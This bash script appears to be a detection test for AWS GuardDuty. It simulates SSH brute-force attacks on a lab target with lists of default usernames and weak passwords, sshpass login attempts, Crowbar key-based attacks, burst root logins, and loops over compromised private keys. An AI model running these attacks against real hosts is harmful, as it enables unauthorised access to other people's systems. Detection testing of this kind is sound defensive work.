#!/bin/bash
source localIps.sh
echo
echo '***********************************************************************'
echo '* Enhanced SSH Brute Force Test                                      *'
echo '* This script simulates an intense SSH brute force attack            *'
echo '* designed to ensure GuardDuty detection                             *'
echo '***********************************************************************'
echo

if [ ! -f "users" ]; then
  echo "Creating users file..."
  echo "ec2-user" > users
  echo "admin" >> users
  echo "root" >> users
  echo "ubuntu" >> users
  echo "administrator" >> users
  echo "centos" >> users
  echo "sysadmin" >> users
  echo "user" >> users
fi

echo "Target IP: $BASIC_LINUX_TARGET"
echo "Starting enhanced SSH brute force attack simulation..."

echo "Phase 1: Increased direct SSH connection attempts (100 tries with multiple users)"
for i in {1..100}; do
  echo "SSH attempt $i"
  for user in $(cat users); do
    ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 $user@$BASIC_LINUX_TARGET 2>/dev/null || true
  done
  sleep 0.3
done

echo
echo "Phase 2: Adding random password attempts"
PASSWORDS=("password" "123456" "admin" "root123" "qwerty" "welcome" "letmein" "abc123")
for i in {1..50}; do
  echo "Password attempt $i"
  USER=$(shuf -n 1 users)
  PASS=${PASSWORDS[$((RANDOM % 8))]}
  sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 $USER@$BASIC_LINUX_TARGET 2>/dev/null || true
  sleep 0.2
done

echo
echo "Phase 3: Enhanced Crowbar tool attacks (20 iterations)"
for j in {1..20}; do
  echo "Crowbar iteration $j"
  sudo ./crowbar/crowbar.py -b sshkey -s $BASIC_LINUX_TARGET/32 -U users -k ./compromised_keys
  sleep 0.5
done

echo
echo "Phase 4: Burst attack pattern"
for burst in {1..5}; do
  echo "Burst $burst"
  for i in {1..30}; do
    ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 root@$BASIC_LINUX_TARGET 2>/dev/null || true
    sleep 0.1
  done
  sleep 2
done

echo
echo "Phase 5: Trying with different key names"
for key in {1..20}; do
  echo "Testing with alternative key $key"
  ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 ec2-user@$BASIC_LINUX_TARGET -i compromised_keys/compromised$key.pem 2>/dev/null || true
  sleep 0.3
done

echo
echo '*****************************************************************************************************'
echo 'Expected GuardDuty Finding:'
echo
echo 'SSH Brute Force with Compromised Keys'
echo 'Expecting two findings - one for the outbound and one for the inbound detection'
echo 'Outbound: Instance ' $RED_TEAM_IP ' is performing SSH brute force attacks against ' $BASIC_LINUX_TARGET
echo 'Finding Type: UnauthorizedAccess:EC2/SSHBruteForce'
echo '*****************************************************************************************************'
echo
echo "Enhanced SSH brute force attack simulation completed. GuardDuty may take 10-30 minutes to generate findings."

